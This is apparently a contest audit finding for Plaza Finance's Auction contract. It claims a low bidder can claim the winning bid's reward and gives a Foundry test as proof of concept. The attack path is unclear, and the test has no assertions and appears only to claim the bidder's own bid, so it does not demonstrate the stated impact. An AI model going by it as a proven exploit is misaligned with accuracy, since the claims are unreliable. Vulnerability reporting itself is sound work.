# Attacker who is not the winner can `claimBid()` of the winner.

### Summary

`insertSortedBid` function depends on both `sellCouponAmount` and `buyReserveAmount` to determine bid placement in the auction. There is no check on the sellCouponAmount and buyReserveAmount to determine the highest bid. This can lead to uncertainty in the highest bid. 

### Root Cause

The root cause is the [insertSortedBid](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Auction.sol#L177-L245) where the highest bid is sorted there

### Internal Pre-conditions

_No response_

### External Pre-conditions

_No response_

### Attack Path

1. Attacker can submit 10 ETH to place a bid
2. A user place the highest bid of 55 ETH
3. User calls the `claimBid()` first


### Impact

No matter who placed the highest bid, anyone with a low bid can call `claimBid` and get the bid reward that is meant for the highest bidder(winner)

### PoC

```solidity
function testBidSuccessMultiBidsWithWei() public {
    address legetimateUser = address(0x123131);

    usdc.mint(bidder, 100 ether);
    usdc.mint(legetimateUser, 1000 ether);

    weth.mint(address(auction), 1000000000000 ether);

    uint256 slot = auction.slotSize();

    vm.startPrank(bidder);
    usdc.approve(address(auction), 40 ether);

    auction.bid(1, slot);

    auction.bid(50 ether, slot);

    auction.bid(1, slot);

    auction.bid(1, slot);

    // auction.bid(10, slot);
    vm.stopPrank();

    vm.startPrank(legetimateUser);
    usdc.approve(address(auction), 100 ether);
    // vm.expectRevert();
    auction.bid(55 ether, slot);
    vm.stopPrank();

    vm.warp(block.timestamp + 15 days);
    vm.prank(pool);
    auction.endAuction();

    vm.prank(bidder);
    auction.claimBid(1);
  }
```
